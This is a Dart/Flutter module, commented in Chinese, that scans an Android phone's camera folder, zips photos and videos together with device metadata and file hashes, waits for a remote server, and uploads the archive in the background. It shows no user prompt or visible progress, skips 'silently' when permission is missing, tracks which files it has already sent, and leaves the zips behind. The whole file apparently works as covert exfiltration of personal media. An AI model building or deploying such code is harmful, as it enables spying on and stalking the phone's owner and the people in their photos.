/// DCIM 打包上传管理器
/// - 扫描 → 打包 zip → 等待服务器 → 单次 HTTP 上传
/// - 打包完成后循环检测服务器，直到通或者超时
/// - 权限判断分 SDK：33+ 用媒体权限，32 及以下用存储权限
/// - 失败重试计数持久化，超过阈值永久跳过
///
/// ⚠️ 当前版本：zip 不会被自动删除，会保留在应用缓存目录
///    路径：/data/data/<包名>/cache/dcim_upload_<时间戳>.zip
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:archive/archive_io.dart';
import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart' show debugPrint;
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  /// 上传目标接口（HTTPS）
  final String uploadUrl;
  /// DCIM Camera 目录真实路径
  final String dcimPath;
  /// 上传超时
  final Duration uploadTimeout;
  /// 单次最多上传文件数
  final int maxFiles;
  /// 单文件最大重试次数
  final int maxAttemptsPerFile;
  /// ZIP 压缩级别（0 = Store / 无压缩，1-9 = Deflate）
  final int zipCompressionLevel;
  /// 媒体扩展名白名单
  final Set<String> mediaExtensions;

  // ── 服务器等待相关 ─────────────────────────────────────────────────
  /// 服务器健康检查 URL。为空时用 uploadUrl 本身。
  /// 建议服务端提供一个轻量的接口，例如 https://your-domain.com/health
  final String healthCheckUrl;
  /// 单次健康检查超时
  final Duration healthCheckTimeout;
  /// 服务器不通时，两次检测之间的间隔
  final Duration serverWaitInterval;
  /// 最多检测次数。超过后本轮放弃（下一轮 WorkManager 会重新走）
  final int serverWaitMaxAttempts;

  const DcimUploadConfig({
    this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
    this.dcimPath = '/storage/emulated/0/DCIM/Camera',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,
    this.maxAttemptsPerFile = 3,
    this.zipCompressionLevel = 0,
    this.mediaExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif',
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm',
    },
    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    // 180 次 × 10 秒 = 30 分钟
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._();
  static final DcimUploadManager instance = DcimUploadManager._();

  static const String _kUploaded = 'dcim_uploaded_paths';
  static const String _kFailedMap = 'dcim_failed_attempts';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  final Set<String> _uploaded = <String>{};
  final Map<String, int> _failed = <String, int>{};

  bool _busy = false;
  bool get isBusy => _busy;
  int get uploadedCount => _uploaded.length;

  // ── 初始化：加载记录 ───────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    if (config != null) _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    _failed.clear();
    final rawFailed = _prefs!.getString(_kFailedMap);
    if (rawFailed != null && rawFailed.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawFailed) as Map<String, dynamic>;
        decoded.forEach((k, v) => _failed[k] = (v as num).toInt());
      } catch (e) {
        debugPrint('[DcimUpload] 失败记录解析失败: $e');
      }
    }

    // ⚠️ 已关闭残留 zip 清理，zip 会一直保留
    // await _cleanStaleZips();

    debugPrint(
        '[DcimUpload] 已记录成功 ${_uploaded.length} 个，失败 ${_failed.length} 个');
  }

  // ── 权限判断：分 SDK ──────────────────────────────────────────────────
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  // ── 上传入口（无权限则静默返回）──────────────────────────────────────
  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }
    final files = await scanFiles();
    await packAndUpload(files);
  }

  // ── 主流程：扫描 → 打包 → 等待服务器 → 上传 ──────────────────────────
  Future<void> packAndUpload(List<File> files) async {
    if (_busy) {
      debugPrint('[DcimUpload] 上一轮未结束，跳过');
      return;
    }
    if (files.isEmpty) {
      debugPrint('[DcimUpload] 无可上传文件');
      return;
    }

    _busy = true;
    File? zipFile;
    try {
      final tmpDir = await getTemporaryDirectory();
      final ts = DateTime.now().millisecondsSinceEpoch;
      zipFile = File('${tmpDir.path}/dcim_upload_$ts.zip');

      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      debugPrint('[DcimUpload] 设备信息: $metadata');

      // ── 收集每个文件的元数据（含 MD5）───────────────────────────────
      final fileInfos = <Map<String, dynamic>>[];
      final usedNames = <String>{};
      final zipNameMap = <String, String>{};

      for (int i = 0; i < files.length; i++) {
        final f = files[i];
        try {
          final st = await f.stat();
          final baseName = f.path.split('/').last;
          var zipName = baseName;
          if (usedNames.contains(zipName)) {
            zipName = '${i}_$baseName';
          }
          usedNames.add(zipName);
          zipNameMap[f.path] = zipName;

          final md5Hex = await _calcMd5(f);
          fileInfos.add({
            'name': baseName,
            'zip_name': zipName,
            'original_path': f.path,
            'size': st.size,
            'modified': st.modified.toIso8601String(),
            'md5': md5Hex,
          });
        } catch (e) {
          debugPrint('[DcimUpload] stat/md5 失败 ${f.path}: $e');
        }
      }

      if (fileInfos.isEmpty) {
        debugPrint('[DcimUpload] 无有效文件，跳过');
        return;
      }

      // ── 打包 ZIP（Store 模式）─────────────────────────────────────
      debugPrint(
          '[DcimUpload] 开始打包（${fileInfos.length} 个文件，level=${_config.zipCompressionLevel}）...');
      final encoder = ZipFileEncoder();
      encoder.create(zipFile.path, level: _config.zipCompressionLevel);
      int packed = 0;
      try {
        final deviceBytes = utf8.encode(jsonEncode(metadata));
        encoder.addArchiveFile(
          ArchiveFile('device_info.json', deviceBytes.length, deviceBytes),
        );
        debugPrint('[DcimUpload] device_info.json 已写入 zip');

        for (final f in files) {
          final zipName = zipNameMap[f.path];
          if (zipName == null) continue;
          try {
            await encoder.addFile(f, zipName);
            packed++;
            if (packed % 10 == 0) {
              debugPrint('[DcimUpload] 已打包 $packed/${fileInfos.length}');
            }
          } catch (e) {
            debugPrint('[DcimUpload] 打包失败 ${f.path}: $e');
          }
        }

        final totalSize =
            fileInfos.fold<int>(0, (s, i) => s + (i['size'] as int));
        final manifest = <String, dynamic>{
          'device': metadata,
          'uploaded_at': DateTime.now().toIso8601String(),
          'file_count': fileInfos.length,
          'packed_count': packed,
          'total_size': totalSize,
          'compression':
              _config.zipCompressionLevel == 0 ? 'store' : 'deflate',
          'files': fileInfos,
        };
        final manifestBytes = utf8.encode(jsonEncode(manifest));
        encoder.addArchiveFile(
          ArchiveFile('manifest.json', manifestBytes.length, manifestBytes),
        );
        debugPrint('[DcimUpload] manifest.json 已写入 zip');
      } finally {
        await encoder.close();
      }

      final zipSize = await zipFile.length();
      debugPrint(
          '[DcimUpload] zip 打包完成: ${zipFile.path.split('/').last} '
          '(${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB, $packed 个文件)');
      debugPrint('[DcimUpload] zip 路径: ${zipFile.path}');

      // ══════════════════════════════════════════════════════════════
      // ★ 关键改动：打包完成后，循环等待服务器可用
      //   期间不重新打包 zip，直到服务器可达或超时
      // ══════════════════════════════════════════════════════════════
      debugPrint('[DcimUpload] 进入服务器检测循环...');
      final serverOk = await _waitForServer();

      if (!serverOk) {
        debugPrint('[DcimUpload] ❌ 等待服务器超时（'
            '${_config.serverWaitMaxAttempts} 次 × '
            '${_config.serverWaitInterval.inSeconds}s），本轮放弃');
        for (final f in files) {
          _failed[f.path] = (_failed[f.path] ?? 0) + 1;
        }
        await _persist();
        return; // 会走 finally 释放 _busy
      }

      // ── 服务器可用，开始上传 ────────────────────────────────────────
      final success = await _uploadZip(zipFile, packed);

      if (success) {
        for (final f in files) {
          _uploaded.add(f.path);
          _failed.remove(f.path);
        }
        debugPrint('[DcimUpload] ✅ 本批 ${files.length} 个文件全部上传成功');
      } else {
        for (final f in files) {
          _failed[f.path] = (_failed[f.path] ?? 0) + 1;
        }
        debugPrint('[DcimUpload] ❌ 本批上传失败，累计失败次数 +1');
      }
      await _persist();
    } catch (e, st) {
      debugPrint('[DcimUpload] ❌ 打包/上传异常: $e\n$st');
    } finally {
      // ⚠️ 已关闭临时 zip 删除，zip 会保留在 cache 目录
      // try {
      //   if (zipFile != null && await zipFile.exists()) {
      //     await zipFile.delete();
      //   }
      // } catch (e) {
      //   debugPrint('[DcimUpload] 删除临时 zip 失败: $e');
      // }
      _busy = false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 服务器检测循环
  // ══════════════════════════════════════════════════════════════════
  /// 循环检测服务器，直到可达或超过最大次数。
  /// 返回 true = 服务器在线，可以上传；false = 放弃本轮
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.uploadUrl);

    debugPrint('[DcimUpload] 健康检查 URL: $url');

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      // 如果外部把 _busy 置为 false（例如取消了），提前退出
      if (!_busy) {
        debugPrint('[DcimUpload] 检测循环被取消');
        return false;
      }

      final ok = await _pingServer(url);
      if (ok) {
        debugPrint('[DcimUpload] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }

      debugPrint('[DcimUpload] 服务器不可达（第 $i/${_config.serverWaitMaxAttempts} 次），'
          '${_config.serverWaitInterval.inSeconds}s 后重试...');

      // 最后一次检测后不再 sleep
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }

    return false;
  }

  /// 单次服务器探测。
  /// 优先用 HEAD（轻量），不支持时回退 GET。
  /// 判据：收到 HTTP 响应且状态码 < 500 视为"服务器可用"。
  Future<bool> _pingServer(Uri url) async {
    // 1. 尝试 HEAD
    try {
      final req = http.Request('HEAD', url);
      final streamed = await req.send().timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      final code = streamed.statusCode;
      // 2xx/3xx/4xx 都说明服务器在线（401/403/404/405 也算）
      return code < 500;
    } catch (_) {
      // HEAD 失败，回退 GET
    }

    // 2. 回退 GET
    try {
      final resp = await http.get(url).timeout(_config.healthCheckTimeout);
      return resp.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ── 扫描：过滤 + 排序 + 取前 N ──────────────────────────────────────
  Future<List<File>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) {
      debugPrint('[DcimUpload] 目录不存在: ${_config.dcimPath}');
      return [];
    }

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      if (!_config.mediaExtensions.contains(name.substring(dot).toLowerCase())) {
        continue;
      }
      if (_uploaded.contains(e.path)) continue;
      if ((_failed[e.path] ?? 0) >= _config.maxAttemptsPerFile) {
        debugPrint('[DcimUpload] 永久跳过（失败 ${_failed[e.path]} 次）: $name');
        continue;
      }

      try {
        final st = await e.stat();
        list.add(_Scanned(e, st.modified));
      } catch (_) {}
    }

    list.sort((a, b) => a.modified.compareTo(b.modified));
    return list.take(_config.maxFiles).map((s) => s.file).toList();
  }

  // ── MD5 计算 ────────────────────────────────────────────────────────
  Future<String> _calcMd5(File f) async {
    try {
      final digest = await md5.bind(f.openRead()).first;
      return digest.toString();
    } catch (e) {
      debugPrint('[DcimUpload] MD5 计算失败 ${f.path}: $e');
      return '';
    }
  }

  // ── 清理临时 ZIP 残留（当前未启用）──────────────────────────────────
  /// 保留此方法备用。将来想启用清理时，在 initialize() 里取消注释即可。
  Future<void> _cleanStaleZips() async {
    try {
      final tmp = await getTemporaryDirectory();
      await for (final e in tmp.list()) {
        if (e is File && e.path.contains('dcim_upload_')) {
          try {
            await e.delete();
            debugPrint('[DcimUpload] 清理残留: ${e.path.split('/').last}');
          } catch (_) {}
        }
      }
    } catch (_) {}
  }

  // ── 上传 ZIP 文件 ───────────────────────────────────────────────────
  Future<bool> _uploadZip(File zip, int fileCount) async {
    try {
      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.files.add(await http.MultipartFile.fromPath('file', zip.path));
      req.fields['fileName'] = zip.path.split('/').last;
      req.fields['fileCount'] = fileCount.toString();

      debugPrint('[DcimUpload] 开始上传 ${zip.path.split('/').last}...');
      final streamed = await req.send().timeout(_config.uploadTimeout);
      final resp = await http.Response.fromStream(streamed);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        debugPrint('[DcimUpload] ✅ HTTP ${resp.statusCode}');
        return true;
      }
      debugPrint('[DcimUpload] ❌ HTTP ${resp.statusCode} body=${resp.body}');
      return false;
    } on TimeoutException {
      debugPrint(
          '[DcimUpload] ❌ 上传超时（${_config.uploadTimeout.inSeconds}s）');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ❌ 上传异常: $e');
      return false;
    }
  }

  // ── 持久化 ──────────────────────────────────────────────────────────
  Future<void> _persist() async {
    await _prefs?.setStringList(_kUploaded, _uploaded.toList());
    await _prefs?.setString(_kFailedMap, jsonEncode(_failed));
  }

  Future<void> reset() async {
    _uploaded.clear();
    _failed.clear();
    await _prefs?.remove(_kUploaded);
    await _prefs?.remove(_kFailedMap);
    debugPrint('[DcimUpload] 记录已清空');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  _Scanned(this.file, this.modified);
}